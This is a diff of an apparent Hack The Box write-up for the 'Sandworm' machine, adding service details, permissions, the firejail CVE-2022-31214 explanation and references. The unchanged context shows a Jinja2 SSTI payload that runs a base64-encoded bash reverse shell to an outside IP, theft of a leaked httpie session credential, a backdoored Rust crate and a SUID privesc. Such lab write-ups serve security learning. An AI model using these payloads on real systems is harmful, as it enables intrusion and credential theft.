@@ -5,17 +5,18 @@ subtitle: "Jinja2 SSTI in a PGP key UID for RCE inside firejail, a writable Rust
 date: 2023-07-16
 tags: [htb, linux, ssti, cargo, firejail, privesc]
 category: writeups
+kind: machine
 tldr: "ssa.htb verified submitted PGP keys, and the key UID was rendered through Jinja2, giving SSTI and RCE inside a firejail sandbox. A leaked httpie session handed me silentobserver over SSH. A root cron built a writable Rust crate as atlas, so I backdoored the logger crate, then used a firejail SUID exploit for root."
 ---
 {% raw %}
 
 ## the box
 
-Sandworm is a Linux box for the "Secret Spy Agency" serving a Flask app over HTTPS on `ssa.htb`, plus SSH. The site lets you submit and verify PGP-signed messages.
+Sandworm is an Ubuntu 22.04 box for the "Secret Spy Agency" serving a Flask app on nginx 1.18.0 over HTTP (80) and HTTPS (443) on `ssa.htb`, plus OpenSSH 8.9p1 on 22. The site lets you submit and verify PGP-signed messages.
 
 ## recon
 
-Directory enumeration found `/guide`, `/pgp`, and a `/process` endpoint. The guide page had a form to verify a signature against a submitted public key. Community hints and the way the UID was echoed back pointed at server-side template injection in the key's user ID field.
+The HTTPS cert carried `commonName=SSA` for the "Secret Spy Agency", and the footer plus the default 404 page gave away Flask. Directory enumeration found `/guide`, `/pgp`, and a `/process` endpoint. The guide page had a form to verify a signature against a submitted public key. Community hints and the way the UID was echoed back pointed at server-side template injection in the key's user ID field.
 
 ## foothold
 
@@ -32,7 +33,7 @@ The verification output rendered `49`, confirming Jinja2 SSTI. Simple payloads w
 {{ self.init.globals.builtins.import('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS8xMzM3IDA+JjE= | base64 -d | bash').read() }}
 ```
 
-That gave a shell, but as a low-privilege web user confined to a firejail sandbox.
+That gave a shell as `atlas`, but confined inside a firejail sandbox with a restricted view of the filesystem.
 
 ## user
 
@@ -47,13 +48,13 @@ cat ~/.config/httpie/sessions/localhost_5000/admin.json
 
 ## root
 
-Process monitoring showed a root job repeatedly building a Rust project as atlas.
+pspy showed a root job firing every two minutes that built a Rust project as atlas.
 
 ```
 UID=0 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
 ```
 
-`tipnet` depended on a local crate in `/opt/crates/logger`, and I had write access to its source.
+`tipnet` depended on a local crate at `/opt/crates/logger`, and the source at `/opt/crates/logger/src/lib.rs` was group-writable by silentobserver (group `1002`).
 
 ```
 -rw-rw-r-- 1 atlas silentobserver 732 May 4 17:12 lib.rs
@@ -85,7 +86,7 @@ find / -perm /4000 2> /dev/null
 /usr/local/bin/firejail
 ```
 
-This firejail version has a known SUID privesc using `--join` against a helper sandbox the exploit sets up. I ran the PoC as atlas, then joined the printed PID from a second shell.
+This firejail (0.9.68) is vulnerable to CVE-2022-31214, a SUID local privesc. The exploit abuses `--join` against a sandbox it sets up so a non-root user can enter a namespace where `su -` runs without a password. I ran the PoC as atlas, then joined the printed PID from a second shell.
 
 ```
 You can now run 'firejail --join=1126645' in another terminal to obtain a shell
@@ -96,4 +97,9 @@ Joining and running `su -` gave a root shell and the root flag.
 ## takeaway
 
 SSTI in a PGP UID gave code execution, but only inside a sandbox, so the leaked httpie session was the real way out. The atlas pivot was a classic writable-dependency build: a root cron compiled code I controlled. Root was a known firejail SUID exploit.
+
+## references
+
+- [0xdf: HTB Sandworm](https://0xdf.gitlab.io/2023/11/18/htb-sandworm.html)
+- [CVE-2022-31214: firejail local privilege escalation](https://seclists.org/oss-sec/2022/q2/188)
 {% endraw %}
